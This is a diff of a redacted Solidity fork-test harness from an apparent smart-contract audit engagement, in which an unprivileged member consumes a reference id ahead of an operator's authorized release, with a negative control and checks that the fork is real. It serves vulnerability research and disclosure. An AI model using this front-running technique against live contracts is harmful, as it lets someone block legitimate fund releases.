@@ -2,30 +2,36 @@
 pragma solidity 0.8.28;
 
 // =============================================================================
-// Fork proof-of-concept — REDACTED EXCERPT
+// Fork proof of concept, redacted excerpt
 // -----------------------------------------------------------------------------
-// This is the real harness used in the engagement, with the target's addresses
-// and the specific mechanism under test replaced by neutral names. It is
-// published to demonstrate technique only; the target program requires approval
-// prior to disclosure, and the unredacted version is in the private annex.
+// This is the harness used in the engagement, published to show the technique.
+// The target program requires approval before disclosure, so these values are
+// redacted here; the unredacted version is in the private annex:
+//   * the FACTORY, TOKEN and HOLDER addresses (placeholders 0xF00, 0x1, 0x2)
+//   * the revert reason expected in test_hypothesis_blocks_then_operator_recovers
+//     (replaced by a neutral string)
+//   * the names of the mechanism under test (replaced by neutral names, so
+//     test names differ from the recorded run in reproducibility.md)
+// The file needs the private values to run. The factory code hash is the one
+// listed in reproducibility.md.
 //
-// What this harness demonstrates:
-//   * forking a live network at a PINNED block, and asserting the fork is real
-//     (chainId + deployed-bytecode hash) before trusting any result
-//   * exercising the REAL deployed contracts — no reimplementation, no mock that
-//     eases the flow
-//   * sourcing real tokens from an on-chain holder instead of faking balances
-//   * a mandatory NEGATIVE CONTROL, so the observed effect is attributable to the
-//     claimed root cause and not to the harness
-//   * bounding the attacker's minimum cost
+// What the harness does:
+//   * forks a live network at a pinned block and checks the chainId and the
+//     deployed bytecode hash before any result is trusted
+//   * runs against the deployed contracts, without a reimplementation or a mock
+//     that eases the flow
+//   * takes real tokens from an on-chain holder instead of faking balances
+//   * includes a negative control, so the observed effect can be attributed to
+//     the claimed root cause and not to the harness
+//   * bounds the attacker's minimum cost
 //
-// Disclosed state injection (permitted only to REACH the in-scope branch, never
-// to shortcut the core's own logic):
-//   * vm.prank(operator) — to enter the privileged branch under test
-//   * vm.prank(holder)   — to source real tokens from an existing holder
+// Disclosed state injection (used only to reach the in-scope branch, never to
+// shortcut the core's own logic):
+//   * vm.prank(operator) to enter the privileged branch under test
+//   * vm.prank(holder) to source real tokens from an existing holder
 // =============================================================================
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test} from "forge-std/Test.sol";
 
 interface IERC20 {
     function transfer(address, uint256) external returns (bool);
@@ -49,12 +55,12 @@ interface IInstance {
 }
 
 contract ForkPoCTest is Test {
-    // Addresses redacted — see private annex.
-    address constant FACTORY = address(0xF00);
-    address constant TOKEN   = address(0xT0E);
-    address constant HOLDER  = address(0xH01); // real on-chain token holder used as faucet
+    // Addresses redacted; the real ones are in the private annex.
+    address constant FACTORY = address(0xF00); // redacted
+    address constant TOKEN   = address(0x1);   // redacted
+    address constant HOLDER  = address(0x2);   // redacted; real on-chain token holder used as faucet
 
-    // keccak256 of the deployed runtime, captured during analysis.
+    // keccak256 of the deployed runtime, as recorded in reproducibility.md.
     bytes32 constant EXPECTED_FACTORY_CODEHASH =
         0x2b4a7a0d4ed306d36ffa362ff70b55983bc529fc3abcf8b764fc357c91f6eae0;
 
@@ -93,8 +99,8 @@ contract ForkPoCTest is Test {
     }
 
     /// The hypothesis: an unprivileged member consumes a reference id before the
-    /// operator's authorized release uses it. Result: the release DOES revert —
-    /// and the operator recovers in the same transaction with a fresh id.
+    /// operator's authorized release uses it. Result: the release does revert,
+    /// but the operator recovers in the same transaction with a fresh id.
     function test_hypothesis_blocks_then_operator_recovers() public {
         address inst = _newInstance(uint128(uint256(keccak256("poc-1"))));
         uint256 collateral = 1_000e6;
@@ -109,9 +115,9 @@ contract ForkPoCTest is Test {
         vm.stopPrank();
         assertTrue(IInstance(inst).refConsumed(targeted), "reference consumed and persisted");
 
-        // the honest, authorized release on the SAME reference now fails
+        // the honest, authorized release on the same reference now fails
         vm.prank(operator);
-        vm.expectRevert(bytes("this transfer has already been processed"));
+        vm.expectRevert(bytes("redacted revert reason")); // redacted; real string in the private annex
         IInstance(inst).release(victim, collateral, targeted);
 
         // ...but the operator immediately re-issues with a fresh reference and succeeds.
@@ -126,7 +132,7 @@ contract ForkPoCTest is Test {
         );
     }
 
-    /// NEGATIVE CONTROL: without the attacker's action, the identical release succeeds.
+    /// Negative control: without the attacker's action, the identical release succeeds.
     function test_negativeControl_noBurn_releaseSucceeds() public {
         address inst = _newInstance(uint128(uint256(keccak256("poc-2"))));
         uint256 collateral = 1_000e6;
